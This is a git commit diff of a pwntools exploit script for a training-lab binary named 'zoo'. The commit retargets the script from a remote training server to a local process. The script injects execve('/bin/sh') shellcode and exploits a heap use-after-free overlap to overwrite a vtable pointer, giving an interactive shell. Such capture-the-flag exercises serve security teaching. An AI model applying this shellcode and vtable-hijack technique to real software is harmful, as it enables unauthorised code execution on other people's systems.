c66fd31b7a487e8fa844685780be16d93aba65d7
Ashen <56328586+jasonkyle1208@users.noreply.github.com>
2022-05-13 13:01:47 +0800

    Update zoo.py

--- LAB/lab15/zoo.py
+++ LAB/lab15/zoo.py
@@ -2,40 +2,42 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
-host = "training.angelboy.tw"
-port = 11015
-context.arch = "amd64"
-r = remote(host,port)
-
+io = process('./zoo')
 
 sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
 def add_dog(name,weight):
-    r.recvuntil(":")
-    r.sendline("1")
-    r.recvuntil(":")
-    r.sendline(name)
-    r.recvuntil(":")
-    r.sendline(str(weight))
+    io.recvuntil(":")
+    io.sendline("1")
+    io.recvuntil(":")
+    io.sendline(name)
+    io.recvuntil(":")
+    io.sendline(str(weight))
 
 def remove_ani(idx):
-    r.recvuntil(":")
-    r.sendline("5")
-    r.recvuntil(":")
-    r.sendline(str(idx))
+    io.recvuntil(":")
+    io.sendline("5")
+    io.recvuntil(":")
+    io.sendline(str(idx))
 
 
 name = 0x605420
-r.recvuntil(":")
-r.sendline("a"*8 + p64(name+8) + sc)
+ptr = name+16
+io.recvuntil(":")
+io.sendline('a'*16+p64(ptr)+sc) # write the evil ptr and the shellcode 
+#gdb.attach(io)
+
 add_dog("a"*8,0)
 add_dog("b"*8,1)
 remove_ani(0)
-vptr = name + 8
-add_dog("a"*72 + p64(vptr),2)
-r.recvuntil(":")
-r.sendline("3")
-r.recvuntil(":")
-r.sendline("0")
 
-r.interactive()
+add_dog("a"*72 + p64(ptr),2) # overlap 
+#gdb.attach(io)
+
+# listen
+io.recvuntil(":")
+io.sendline("3")
+io.recvuntil(":")
+io.sendline("0")
+
+io.interactive()
